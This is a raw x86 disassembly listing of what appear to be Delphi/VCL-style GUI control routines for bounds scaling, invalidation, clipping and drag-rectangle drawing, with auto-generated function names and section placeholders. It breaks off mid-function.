mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_455250
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_45534b
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_4033e8
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455352
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418f60
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_4033e8
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_4033e8
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418c68
sub_45535c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_455e94
mov edx edi
mov eax ebx
call sub_45540c
mov edx edi
mov eax ebx
call sub_456ca4
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4553c8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403fd0
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_45540c
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_455468
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_455494
mov edx eax
mov ecx esp
mov eax esi
call sub_417744
mov edx esp
mov eax ebx
call sub_4558d8
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4554ac
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_455450
mov ecx esp
mov edx esi
call sub_417744
mov edx esp
mov eax ebx
call sub_4558d8
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4554d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_455555
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45555c
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
sub_455564
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_455590
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4555bc
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_470d30
sub_4555ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_456c00
sub_455668
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_424a2c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_424a48
sub_455834
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4558ca
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_421844
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_455a4c
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404388
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4558d1
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_455a7c
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_4558d8
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_455920
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
test esi esi
je r-xdata
mov edx ebx
call sub_458fc0
mov edx ebx
mov eax esi
call sub_458eec
mov eax ebx
call sub_4550a0
sub_45596c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_4033e8
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_456c00
mov eax edi
mov si 0xffd0
call sub_4033e8
sub_455a04
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_469be8
mov edx ebx
mov eax esi
call sub_4213bc
sub_455a28
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_456c00
pop ebx
retn
sub_455a4c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4559c0
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_40406c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_4559d0
sub_455a7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_455ad1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_455a4c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404388
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455ad8
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax esi
call sub_40443c
mov edx eax
mov eax ebx
call sub_455a28
sub_455afc
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_424988
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_456c00
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_424988
mov [ ebx + 0x84 ] eax
sub_455c84
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_455c74
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_452c1c
mov eax esi
call sub_452c1c
jmp r-xdata
sub_455cbc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_418e20
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418cb4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_418e40
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_455e94
mov eax ebx
call sub_46cc80
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_4033e8
sub_455d3c
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_455cbc
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_455cbc
jmp r-xdata
sub_455d60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_455df6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455dfd
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
sub_455e08
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_418e20
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_418dc4
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4553ec
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455e94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45c684
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4553ec
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45c380
push eax
call InvalidateRect
push ebp
call sub_455e08
pop ecx
test al al
je r-xdata
mov al 0x1
sub_455f30
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_46cc58
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_456c00
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_4033e8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_455f94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45c684
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45c380
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_45606d
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_45a154
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45c380
push eax
call ReleaseDC
retn
sub_4560f4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax edi
call sub_456c34
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_455590
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406cb0
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_456c00
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_453d9c
sub_4561c8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_456204
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_456250
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_45627c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4559f0
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_4559dc
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_4029f0
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_4029f0
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_45c380
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_456360
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_4563ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_4033e8
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_4033e8
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_456470
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_4564bc
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_456508
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456623
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_424fa8
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
